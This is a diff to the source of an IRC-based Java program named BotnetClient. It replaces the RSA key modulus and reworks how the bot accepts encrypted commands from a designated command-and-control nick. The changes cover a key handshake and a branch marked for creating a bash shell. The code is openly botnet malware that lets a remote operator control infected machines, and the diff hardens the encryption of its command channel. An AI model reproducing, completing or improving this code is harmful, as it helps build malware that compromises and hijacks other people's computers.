@@ -37,7 +37,7 @@ public class BotnetClient extends PircBot {
 	
 	private MsgEncrypt m;
 	
-	private String rsaMod = "8406584928969230912194776015676041377044384281902059425892455383226755881066602094231727976096331374098875813287829766341473134627956293747440322615391837";
+	private String rsaMod = "101303910710900226274349030555647780242601234001053700242140440355421711719614388158299014962476550026734960750908999517650997683806704967780217503081010517989368347136612497678731041194040683080313069165522077936751386218907487890298947166101897033800426412821219973850448264931913696365980503099134782271671";
 	private String rsaPublicExp = "65537";
 	
 	private boolean leased = false;
@@ -231,26 +231,15 @@ public class BotnetClient extends PircBot {
 			try {
 				if (!chat.getNick().equalsIgnoreCase(CC)) {
 					System.out.println(chat.getNick() + "<" + chat.getHostname() + " | " + chat.getNumericalAddress() + "> tried to use me" );
-				} else {
+				} else { 
 					chat.accept();
-					String s2 = chat.readLine();
-					System.out.println("c:" + s2);
-					System.out.println("m:" + m.decryptRSA(s2));
-					String command = m.decryptRSA(s2);
+					String command = m.decryptRSA(chat.readLine());
 					if (command.equalsIgnoreCase("key")) {
-						//Read the key info using char.readLine(); 
-						String otherKey = chat.readLine().replace("::", "\n").replace("-", "\r").replace("_", "\r\n");
-						//s2 = chat.readLine();
-						//String otherKey = m.decryptRSA(s2);
-						//System.out.println("c:" + s2);
-						//System.out.println("m:" + m.decryptRSA(s2));
-						//System.out.println("key: " + otherKey);
-						String info = chat.readLine().replace("::", "\n").replace("-", "\r").replace("_", "\r\n");
-						//System.out.println("info: " + info);
+						String otherKey = m.decryptRSA(chat.readLine());
+						String info = m.decryptRSA(chat.readLine());
 						m.setPubParams(info);
 						m.handShake(otherKey);
-						//chat.sendLine(m.getStrKey().replace("\r\n", "_").replace("\r", "-").replace("\n", "::"));
-						chat.sendLine(m.getStrKey().replace("\r\n", "_").replace("\r", "-").replace("\n", "::"));
+						chat.sendLine(m.encryptRSA(m.getStrKey()));
 						chat.close();
 					} else if (m.decryptMsg(command).equalsIgnoreCase("shell")) {
 						//Create the bash shell
